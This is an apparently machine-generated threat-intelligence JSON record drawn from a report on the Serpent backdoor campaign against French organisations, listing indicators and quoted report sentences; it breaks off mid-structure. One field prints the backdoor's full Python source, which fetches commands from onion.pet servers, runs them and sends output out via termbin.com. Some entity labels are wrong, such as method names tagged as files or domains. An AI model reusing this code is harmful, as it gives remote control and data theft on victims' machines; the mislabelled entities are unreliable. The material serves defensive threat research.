{
    "title": "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
    "url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain",
    "threats": {
        "Threat": [
            {
                "token": {
                    "id": "<THREAT_0xc791b23c>",
                    "type": "Threat",
                    "value": "serpent"
                },
                "references": {
                    "sentences": [
                        "The threat actor attempted to install a backdoor on a potential victims device, which could enable remote administration, command and control (C2), data theft, or deliver other additional payloads. Proofpoint refers to this backdoor as Serpent. The ultimate objective of the threat actor is currently unknown.",
                        "The Python script (the Serpent backdoor) is as follows:",
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely.",
                        "Figure 3: Serpent backdoor attack chain.",
                        "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                        "Proofpoint identified a targeted attack leveraging an open-source package installer Chocolatey to deliver a backdoor.<crlf>The attack targeted French entities in the construction, real estate, and government industries.<crlf>The attacker used a resume themed subject and lure purporting to be GDPR information.<crlf>The attacker used steganography, including a cartoon image, to download and install the Serpent backdoor.<crlf>The attacker also demonstrated a novel detection bypass technique using a Scheduled Task.<crlf>Objectives are currently unknown however based on the tactics and targeting observed it is likely an advanced, targeted threat."
                    ],
                    "titles": [
                        "Overview",
                        "Campaign Details",
                        "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                        "Key Findings"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<SHA256_0x6a9d0bbb>",
                            "type": "Hash",
                            "hash_type": "SHA256",
                            "value": "8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x6a35444b>",
                            "type": "Category",
                            "value": "proxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<EMAIL_0x5a350a6b>",
                            "type": "Email",
                            "value": "jeanne.vrakele@gmail.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x70e047c4>",
                            "type": "Url",
                            "value": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x8f0b70ab>",
                            "type": "Domain",
                            "value": "run.stdout.read"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x63f8d79a>",
                            "type": "Domain",
                            "value": "microsoftsecurityupdate.py"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<EMAIL_0x92bd121>",
                            "type": "Email",
                            "value": "no-reply@dgfip-nanterre.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<SHA256_0x2d999c1>",
                            "type": "Hash",
                            "hash_type": "SHA256",
                            "value": "ec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<INDUSTRY_0x6ba3d0a8>",
                            "type": "Industry",
                            "value": "government"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xb6c4c488>",
                            "type": "File",
                            "value": "termbin_cnx.connect"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0xe64967df>",
                            "type": "Domain",
                            "value": "termbin.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb6fb790d>",
                            "type": "Url",
                            "value": "https://www.fhccu.com/images/ship3.jpg"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x28c400d5>",
                            "type": "File",
                            "value": "termbin_cnx.send"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<EMAIL_0x856242b8>",
                            "type": "Email",
                            "value": "jean.dupontel@protonmail.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaa129c7a>",
                            "type": "File",
                            "value": "time.sleep"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x785e1f>",
                            "type": "File",
                            "value": "sock.recv"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x2c96d624>",
                            "type": "File",
                            "value": "termbin_cnx.recv"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaaec47f2>",
                            "type": "File",
                            "value": "socks.socksocket"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "use_geo",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        }
                    },
                    {
                        "src": {
                            "id": "<SHA256_0xa309135c>",
                            "type": "Hash",
                            "hash_type": "SHA256",
                            "value": "f988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xfcf2a5fa>",
                            "type": "File",
                            "value": "ship.jpg"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7d600cb1>",
                            "type": "File",
                            "value": "socket.gethostname"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xdc412f5b>",
                            "type": "Url",
                            "value": "http://shorturl.at/qzes8"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x998175ae>",
                            "type": "Url",
                            "value": "https://www.fhccu.com/images/7.jpg"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ]
    },
    "ttps": {},
    "meanings": {
        "Category": [
            {
                "token": {
                    "id": "<CATEGORY_0x96121f83>",
                    "type": "Category",
                    "value": "backdoor"
                },
                "references": {
                    "sentences": [
                        "The threat actor attempted to install a backdoor on a potential victims device, which could enable remote administration, command and control (C2), data theft, or deliver other additional payloads. Proofpoint refers to this backdoor as Serpent. The ultimate objective of the threat actor is currently unknown.",
                        "The Python script (the Serpent backdoor) is as follows:",
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely.",
                        "Figure 3: Serpent backdoor attack chain.",
                        "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                        "Proofpoint identified a targeted attack leveraging an open-source package installer Chocolatey to deliver a backdoor.<crlf>The attack targeted French entities in the construction, real estate, and government industries.<crlf>The attacker used a resume themed subject and lure purporting to be GDPR information.<crlf>The attacker used steganography, including a cartoon image, to download and install the Serpent backdoor.<crlf>The attacker also demonstrated a novel detection bypass technique using a Scheduled Task.<crlf>Objectives are currently unknown however based on the tactics and targeting observed it is likely an advanced, targeted threat."
                    ],
                    "titles": [
                        "Overview",
                        "Campaign Details",
                        "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                        "Key Findings"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x28c400d5>",
                            "type": "File",
                            "value": "termbin_cnx.send"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x2c96d624>",
                            "type": "File",
                            "value": "termbin_cnx.recv"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7d600cb1>",
                            "type": "File",
                            "value": "socket.gethostname"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x47aadca4>",
                            "type": "File",
                            "value": "socket.socket"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x8f6856f3>",
                            "type": "File",
                            "value": "cmd.split"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x785e1f>",
                            "type": "File",
                            "value": "sock.recv"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaa129c7a>",
                            "type": "File",
                            "value": "time.sleep"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaaec47f2>",
                            "type": "File",
                            "value": "socks.socksocket"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0x8f0b70ab>",
                            "type": "Domain",
                            "value": "run.stdout.read"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xb6c4c488>",
                            "type": "File",
                            "value": "termbin_cnx.connect"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<DOMAIN_0xe64967df>",
                            "type": "Domain",
                            "value": "termbin.com"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xc8ecca29>",
                    "type": "Category",
                    "value": "c2"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<CATEGORY_0x6a35444b>",
                    "type": "Category",
                    "value": "proxy"
                },
                "references": {
                    "sentences": [
                        "In addition to the images used in this attack chain Proofpoint researchers have observed and identified additional payloads being served from the same host. One of particular interest is utilizing what Proofpoint believes to be a novel application of signed binary proxy execution using schtasks.exe. Notably, this is an attempt to bypass detection by defensive measures.",
                        "The script then uses Chocolatey to install Python, including the pip Python package installer, which it then uses to install various dependencies including PySocks, a Python based reverse proxy client that enables users to send traffic through SOCKS and HTTP proxy servers.",
                        "The threat actor uses a Tor proxy for command and control (C2) infrastructure, for example:"
                    ],
                    "titles": [
                        "Campaign Details",
                        "Additional Tooling"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x6a35444b>",
                            "type": "Category",
                            "value": "proxy"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x70e047c4>",
                            "type": "Url",
                            "value": "http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x6a35444b>",
                            "type": "Category",
                            "value": "proxy"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0x6a35444b>",
                            "type": "Category",
                            "value": "proxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xb68aa214>",
                    "type": "Category",
                    "value": "rat"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xf1a480bb>",
                    "type": "Category",
                    "value": "malware"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely.",
                        "2851286 - ETPRO MALWARE Malicious Script Retrieved via Image Request",
                        "Leveraging Chocolatey as an initial payload may allow the threat actor to bypass threat detection mechanisms because it is a legitimate software package and would not immediately be identified as malicious. The follow-on use of legitimate Python tools observed in network traffic may also not be flagged or identified as malicious. The use of steganography in the macro and follow-on payloads is unique; Proofpoint rarely observes the use of steganography in campaigns. Additionally, the technique using schtasks.exe to execute any desired portable executable file is also unique and previously unobserved by Proofpoint threat researchers."
                    ],
                    "titles": [
                        "Threat Assessment",
                        "Campaign Details",
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ],
        "Geo": [
            {
                "token": {
                    "id": "<GEO_0xab0ca84f>",
                    "type": "Geo",
                    "value": "french"
                },
                "references": {
                    "sentences": [
                        "Proofpoint observed new, targeted activity impacting French entities in the construction and government sectors. The threat actor used macro-enabled Microsoft Word documents to distribute the Chocolatey installer package, an open-source package installer. Various parts of the VBA macro include the following ASCII art and depict a snake as below.",
                        "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                        "Proofpoint identified a targeted attack leveraging an open-source package installer Chocolatey to deliver a backdoor.<crlf>The attack targeted French entities in the construction, real estate, and government industries.<crlf>The attacker used a resume themed subject and lure purporting to be GDPR information.<crlf>The attacker used steganography, including a cartoon image, to download and install the Serpent backdoor.<crlf>The attacker also demonstrated a novel detection bypass technique using a Scheduled Task.<crlf>Objectives are currently unknown however based on the tactics and targeting observed it is likely an advanced, targeted threat.",
                        "In the observed campaign, messages are in French and purport to be, for example:"
                    ],
                    "titles": [
                        "Overview",
                        "Campaign Details",
                        "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain",
                        "Key Findings"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<GEO_0xab0ca84f>",
                            "type": "Geo",
                            "value": "french"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
